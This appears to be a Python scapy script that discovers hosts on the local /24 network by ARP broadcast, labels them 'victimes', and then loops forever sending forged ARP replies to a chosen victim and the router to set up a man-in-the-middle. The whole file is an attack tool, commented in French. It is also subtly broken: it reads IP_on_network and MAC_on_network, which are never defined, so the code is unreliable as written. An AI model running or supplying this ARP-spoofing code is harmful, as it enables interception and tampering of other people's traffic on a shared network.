#!/usr/bin/env python3
from scapy.all import *
from scapy.all import IP, Ether, ARP, UDP, DNS, DNSRR, DNSQR, srp, get_if_addr, get_if_hwaddr

network_addr = get_if_addr(conf.iface).split('.')
network_addr = network_addr[0] + "." + network_addr[1] + "." + network_addr[2] + ".0/24"

packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_addr) # Cree les paquets

victimes = []

for sent, received in srp(packet, timeout=3)[0]:
    victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
# Ajoute les infos de chaque nouvel appareil trouve dans le tableau

print("\n" + "Available devices in the network :" + "\n" + "IP" + " "*18 + "MAC")
for victime in victimes: # affiche les adresse ip et mac des appareils connectes au reseau qui sont dans le tableau victimes
    print(victime['ip'])
    print(victime['mac'] + "\n") 

mac_of_atk = get_if_hwaddr(conf.iface) # obtient l'adresse mac de l'attaquant

victim_IP = IP_on_network[1]
victim_MAC = MAC_on_network[1]

routeur_IP = IP_on_network[2]
routeur_MAC = MAC_on_network[2]

while True: # MITM 
    spoof_arp_routeur = Ether(src=mac_of_atk)/ARP(op=2, pdst=routeur_IP, hwdst=routeur_MAC, psrc=victim_IP)
    spoof_arp_victim = Ether(src=mac_of_atk)/ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=routeur_IP)
    send_spoof2 = sendp(spoof_arp_routeur)
    send_spoof1 = sendp(spoof_arp_victim)
    